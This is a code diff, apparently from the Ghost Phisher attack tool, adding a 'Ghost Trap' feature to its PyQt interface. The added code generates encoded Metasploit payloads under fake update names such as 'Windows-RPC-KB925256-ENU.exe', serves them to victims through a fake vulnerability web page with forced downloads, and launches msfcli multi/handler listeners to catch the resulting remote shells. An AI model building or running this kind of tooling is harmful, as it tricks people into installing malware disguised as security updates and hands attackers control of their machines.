+    #######################################################
+    #           GHOST TRAP FUNCTIONS AND SIGNALS          #
+    #######################################################
+
+    def update_ghost_spawn_interfaces(self):
+        ''' Changes the ipaddress on ip combo when
+            user changes the index of interface combo
+        '''
+        global usable_interface_cards
+
+        ip_address = []             #Holds ip address of the selected card
+
+        selected_interface = str(self.spawn_http_interface_combo.currentText())   #currently selected interface card
+        try:
+            ip_address.append(usable_interface_cards[selected_interface])
+        except KeyError:
+            pass
+        self.spawn_ip_combo.clear()                                       #clear the ip address combo
+        self.spawn_ip_combo.addItems(ip_address)                          #display ip address on combo
+        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())
+
+
+
+    def vulnarabilty_page_choice(self):
+        if(self.ghost_vul_combo.isChecked()):
+            self.custom_page_label_2.setEnabled(False)
+            self.custom_page_button.setEnabled(False)
+            self.custom_page_label.setEnabled(False)
+        else:
+            self.custom_page_label_2.setEnabled(True)
+            self.custom_page_button.setEnabled(True)
+            self.custom_page_label.setEnabled(True)
+
+
+    def metasploit_payload_choice(self):
+        self.metasploit_installation()
+        self.metasploit_settings_box.setVisible(True)
+        self.custom_payload_box.setVisible(False)
+        self.custom_payload_radio.setChecked(False)
+
+
+
+    def custom_payload_choice(self):
+        self.ghost_spawn_start.setEnabled(True)
+        self.ghost_spawn_stop.setEnabled(False)
+        self.ghost_spawn_browser.clear()
+        self.metasploit_settings_box.setVisible(False)
+        self.custom_payload_box.setVisible(True)
+        self.metasploit_payload_radio.setChecked(False)
+
+
+    def encode_number_list(self):
+        encode_int = []
+        for number in range(1,17):
+            encode_int.append(str(number))
+        self.comboBox_2.addItems(encode_int)
+
+
+    def metasploit_payloads(self):
+        self.encode_combo.addItems(variables.metasploit_encoders)
+        self.linux_payload_combo.addItems(variables.metasploit_linux_payloads)
+        self.windows_payload_combo.addItems(variables.metasploit_windows_payloads)
+
+
+    def metasploit_is_installed(self):
+        msfconsole = commands.getstatusoutput('which msfconsole')[0]
+        msfencode = commands.getstatusoutput('which msfencode')[0]
+        msfpayload = commands.getstatusoutput('which msfpayload')[0]
+
+        if bool(msfconsole) and bool(msfencode) and bool(msfpayload):
+            return(False)
+        return(True)
+
+
+
+    def metasploit_installation(self):
+        if not self.metasploit_is_installed():
+            self.ghost_spawn_browser.clear()
+            self.ghost_spawn_browser.append('<font color=red>Metasploit framework is currently not installed on this\
+            computer, please visit </font><font color=blue><a href="http://www.metasploit.com/">http://www.metasploit.com/</a></font><font color=red> to get a working copy</font>')
+            self.metasploit_settings_box.setEnabled(False)
+            self.ghost_spawn_start.setEnabled(False)
+            self.ghost_spawn_stop.setEnabled(False)
+
+
+    def browse_custom_webpage(self):
+        self.custom_spawn_page_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Webpage","","HTML Files(*.html *.htm)"))
+        if self.custom_spawn_page_path:
+            self.custom_page_label_2.setText(self.custom_spawn_page_path)
+
+
+    def custom_windows_executable_payload(self):
+        if not self.windows_exec_checkbox.isChecked():
+            QtGui.QMessageBox.warning(self,"Custom windows payload not selected","Please click on the windows checkbox to activate this option")
+        else:
+            self.custom_windows_exec_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Windows Executable",""))
+
+            if self.custom_windows_exec_path:
+                self.windows_exec_edit.setText(self.custom_windows_exec_path)
+
+
+    def custom_linux_executable_payload(self):
+        if not self.linux_exec_checkbox.isChecked():
+            QtGui.QMessageBox.warning(self,"Custom Linux payload not selected","Please click on the linux checkbox to activate this option")
+        else:
+            self.custom_linux_exec_path = str(QtGui.QFileDialog.getOpenFileName(self,"Browse Linux Executable",""))
+
+            if self.custom_linux_exec_path:
+                self.linux_exec_edit.setText(self.custom_linux_exec_path)
+
+
+    # USER PROCESS DISPLAY
+
+    def clear_all_displays(self):
+        self.ghost_spawn_browser.clear()
+        self.nitialize_label.setEnabled(False)
+        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.setting_payload_label.setEnabled(False)
+        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.create_cache_label.setEnabled(False)
+        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.http_start_label.setEnabled(False)
+        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))
+
+
+    def display_initialization(self,status):
+        self.ghost_spawn_browser.clear()
+
+        if self.dns_control:
+            self.display_error_message("DNS Server is currently not started,\
+            it recommended that you use this attack with the DNS server for optimum client redirections")
+
+        if status:
+            self.ghost_spawn_browser.append('<font color=green>Starting Internal Processes...</font>')
+            self.nitialize_label.setEnabled(True)
+            self.initlaize_led.setPixmap(QtGui.QPixmap(self.green_led))
+        else:
+            self.nitialize_label.setEnabled(False)
+            self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
+
+
+
+    def display_payload_initlializaton(self,status):
+        if status:
+            self.setting_payload_label.setEnabled(True)
+            self.payload_led.setPixmap(QtGui.QPixmap(self.green_led))
+        else:
+            self.setting_payload_label.setEnabled(False)
+            self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
+
+
+    def display_cache_initialization(self,status):
+        if status:
+            self.create_cache_label.setEnabled(True)
+            self.cache_led.setPixmap(QtGui.QPixmap(self.green_led))
+        else:
+            self.create_cache_label.setEnabled(False)
+            self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
+
+
+    def display_http_initlialization(self,status):
+        if status:
+            self.http_start_label.setEnabled(True)
+            self.start_http_led.setPixmap(QtGui.QPixmap(self.green_led))
+        else:
+            self.http_start_label.setEnabled(False)
+            self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))
+
+
+    def display_error_message(self,message):
+        self.ghost_spawn_browser.append('<font color=red>' + message + '</font>')
+
+    def display_information(self,color,message):
+        self.ghost_spawn_browser.append('<font color=%s>%s</font>'%(color,message))
+
+
+    def display_new_connection(self):
+        self.display_information("blue",ghost_trap_http.control_settings['new connection'])
+
+
+    def new_download(self):
+        self.display_information("blue",ghost_trap_http.control_settings['new download'])
+
+
+
+    # METASPLOIT PAYlOAD ERRORS
+
+    def metasploit_windows_error(self):
+        self.display_error_message("Metasploit Windows Payload Creation failed: %s"%(\
+        self.metasploit_object.variables['windows payload error']))
+        self.metasploit_object.terminate()
+
+
+    def metasploit_linux_error(self):
+        self.display_error_message("Metasploit Linux Payload Creation failed: %s"%(\
+        self.metasploit_object.variables['linux payload error']))
+        self.metasploit_object.terminate()
+
+    # Stop GHOST TRAP SERVER
+
+    def ghost_trap_stop(self):
+        os.environ["ghost_trap_http_server"] = "stop"
+        ghost_trap_http.cookies = []
+        self.ghost_spawn_stop.setEnabled(False)
+        self.ghost_spawn_start.setEnabled(True)
+        self.display_error_message("Stopped at %s"%(time.ctime()))
+        self.nitialize_label.setEnabled(False)
+        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.setting_payload_label.setEnabled(False)
+        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.create_cache_label.setEnabled(False)
+        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
+        self.http_start_label.setEnabled(False)
+        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))
+        commands.getstatusoutput("killall xterm")
+
+
+    # EVALUATE USER OPTIONS
+
+
+    def launch_ghost_trap(self):
+        self.clear_all_displays()
+        os.environ["ghost_trap_http_server"] = "start"                                  # Activates Ghost Trap Http Server API
+
+        if self.ghost_vul_combo.isChecked():
+            ghost_trap_http.control_settings['windows_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/windows_default.htm'   # Ghosts Default vulnerability Page
+            ghost_trap_http.control_settings['linux_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/linux_default.htm'   # Ghosts Default vulnerability Page
+            self.display_initialization(True)
+            self.Stage_2_process()
+        else:
+            if not self.custom_page_label_2.text():
+                self.clear_all_displays()
+                QtGui.QMessageBox.warning(self,"Invalid Custom Page Path","Please Browse and select a custom webpage to use")
+            else:
+                ghost_trap_http.control_settings['windows_webpage']  = str(self.custom_page_label_2.text())   # Use Custom Vulnerability page
+                ghost_trap_http.control_settings['linux_webpage']  = str(self.custom_page_label_2.text())
+                self.display_initialization(True)
+                self.Stage_2_process()
+
+
+    def Stage_2_process(self):
+        if self.metasploit_payload_radio.isChecked():   # If Metasploit Payload is Selected as Choice
+
+            self.metasploit_object = metasploit_payload.metasploit()             # Metasploit Thread class redefined
+
+            ghost_trap_http.control_settings['windows_payload'] = "/tmp/Windows-RPC-KB925256-ENU.exe"
+            ghost_trap_http.control_settings['linux_payload'] = "/tmp/kernel_1.72_update_i386.run"
+
+            self.display_payload_initlializaton(True)
+
+            encoder_number = str(self.comboBox_2.currentText())
+            encoder_type = str(self.encode_combo.currentText())
+            ip_address = str(self.ip_address_edit.text())
+            port_setting = str(self.port_setting_edit.text())
+            linux_payload = str(self.linux_payload_combo.currentText())
+            windows_payload = str(self.windows_payload_combo.currentText())
+
+            self.display_information('green',"Creating Payloads...")
+
+            self.connect(self.metasploit_object,QtCore.SIGNAL("payloads created successfully"),self.Stage_3_process)   # Check if payloads were created successfully
+            self.connect(self.metasploit_object,QtCore.SIGNAL('windows payload error'),self.metasploit_windows_error)
+            self.connect(self.metasploit_object,QtCore.SIGNAL('linux payload error'),self.metasploit_linux_error)
+
+            # Settings Metasploit Class variables
+
+            self.metasploit_object.variables['encode_number'] = encoder_number
+            self.metasploit_object.variables['encoder_type'] = encoder_type
+            self.metasploit_object.variables['ip_address'] = ip_address
+            self.metasploit_object.variables['port_setting'] = port_setting
+            self.metasploit_object.variables['linux_payload'] = linux_payload
+            self.metasploit_object.variables['windows_payload'] = windows_payload
+
+            if os.path.exists(ghost_trap_http.control_settings['windows_payload']):     # Delete Old windows payload files
+                os.remove(ghost_trap_http.control_settings['windows_payload'])
+
+            if os.path.exists(ghost_trap_http.control_settings['linux_payload']):       # Delete Old Linux payload files
+                os.remove(ghost_trap_http.control_settings['linux_payload'])
+
+            self.metasploit_object.variables['template'] = os.getcwd() + os.sep + 'Cache/template.exe'
+            self.metasploit_object.variables['output_path_windows'] = ghost_trap_http.control_settings['windows_payload']    # Create New windows payload file
+
+            self.metasploit_object.variables['output_path_linux'] = ghost_trap_http.control_settings['linux_payload']
+
+            self.metasploit_object.start()                               # Starts the Payload creation thread
+
+            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- WINDOWS
+            windows_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
+            windows_console_string = windows_metapsloit_string % (windows_payload,ip_address,str(port_setting))
+            subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- LINUX
+            linux_metapsloit_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfcli exploit/multi/handler PAYLOAD=%s LHOST=%s LPORT=%s E"'''
+            linux_console_string = linux_metapsloit_string % (linux_payload,ip_address,str(int(port_setting) + 1))
+            subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
+
+        else:                                                       # If Custom payload is selected as Choice
+            progress = 0
+            if bool(self.windows_exec_checkbox.isChecked()) and bool(self.windows_exec_edit.text()):
+                ghost_trap_http.control_settings['windows_payload'] = str(self.windows_exec_edit.text())
+                ghost_settings.create_settings("self.windows_exec_edit",str(self.windows_exec_edit.text()))
+                progress += 1
+            else:
+                self.display_payload_initlializaton(False)
+                self.display_error_message("Custom windows payload is not setted, please check settings")
+
+            if bool(self.linux_exec_checkbox.isChecked()) and bool(self.linux_exec_edit.text()):
+                ghost_trap_http.control_settings['linux_payload'] = str(self.linux_exec_edit.text())
+                ghost_settings.create_settings('self.linux_exec_edit',str(self.linux_exec_edit.text()))
+                progress += 1
+            else:
+                self.display_payload_initlializaton(False)
+                self.display_error_message('Custom linux payload is not setted, please check settings')
+
+            if progress == 2:
+                self.display_payload_initlializaton(True)
+                self.display_information('green',"Setting Payloads...")
+                self.Stage_3_process()
+            else:
+                self.display_error_message("Stopped")
+
+
+
+    def Stage_3_process(self):
+        self.display_cache_initialization(True)
+
+        ghost_trap_http.set_payload_sizes()         # Sets payload sizes for HTML
+
+        # EVALUATE HTTP SETTINGS HERE
+
+        self.display_information('green',"Creating Cache objects...")   # Display next phase
+
+        # HTML SETTINGS FOR USER INTERFACE GOES HERE
+
+        if self.cookies_checkbox.isChecked():
+            ghost_trap_http.control_settings['cookies'] = 1
+        else:
+            ghost_trap_http.control_settings['cookies'] = 0
+
+        if self.force_download_checkbox.isChecked():
+            ghost_trap_http.control_settings['force download'] = 1
+        else:
+            ghost_trap_http.control_settings['force download'] = 0
+
+        if self.respond_to_all_radio.isChecked():
+            ghost_trap_http.control_settings['answer all'] = 1
+        else:
+            ghost_trap_http.control_settings['answer all'] = 0
+
+        if self.respond_windows_radio.isChecked():
+            ghost_trap_http.control_settings['answer windows'] = 1
+        else:
+            ghost_trap_http.control_settings['answer windows'] = 0
+
+        if self.respond_linux_radio.isChecked():
+            ghost_trap_http.control_settings['answer linux'] = 1
+        else:
+            ghost_trap_http.control_settings['answer linux'] = 0
+
+        ghost_trap_http.control_settings['port'] = str(self.ghost_trap_http_edit.text())
+        ghost_trap_http.control_settings['ip_address'] = str(self.spawn_ip_combo.currentText())
+
+        if os.environ["ghost_fake_http_control"] == "start":                            # Check if the Fake HTTP Server is running
+            if str(self.ghost_trap_http_edit.text()) == str(self.use_port_http.text()):   # Check if the Fake HTTP Server and TRAP are running on same port
+                QtGui.QMessageBox.warning(self,"Duplicate port settings","Ghost Fake HTTP Server is currently running on\
+                the selected port, Please change either of the port settings")
+                self.display_error_message("Stopped")
+            else:
+                self.Stage_4_process()
+        else:
+            self.Stage_4_process()
+
+
+
+    def Stage_4_process(self):
+        ghost_trap_http.start()
+        self.ghost_spawn_start.setEnabled(False)
+        self.ghost_spawn_stop.setEnabled(True)
+        self.display_information("green","Starting HTTP Server...")
+        self.display_information("green"," ")               # Leave a gap
+        self.display_information("green","Started at %s"%(time.ctime()))
+        self.display_information("green"," ")               # Leave a gap
+
+        self.display_http_initlialization(True)
 
 
 
@@ -2402,19 +1926,23 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
         global http_terminal
         answer = QtGui.QMessageBox.question(self,"Ghost Phisher","Are you sure you want to quit?",QtGui.QMessageBox.Yes,QtGui.QMessageBox.No)
         if answer == QtGui.QMessageBox.Yes:
-            if dns_contol == 0:
+
+            if(os.environ.get("ghost_fake_http_control") == "start"):
+                    self.stop_http()
+
+            if self.dns_control == 0:
                 self.stop_dns()
-            if http_control == 0:
-                try:
-                    commands.getstatusoutput('killall ettercap')
-                    commands.getstatusoutput('kill -9 %s'%(http_terminal.pid))
-                except:pass
+
             try:
                 commands.getstatusoutput('killall airbase-ng')
                 self.stop_dhcp()
-                self.stop_http()
+
             except NameError:
                 pass
+            if self.metasploit_object.isRunning():
+                self.metasploit_object.terminate()
+            commands.getstatusoutput("killall xterm")
+            ghost_settings.close_setting_file()
             event.accept()
         else:
             event.ignore()
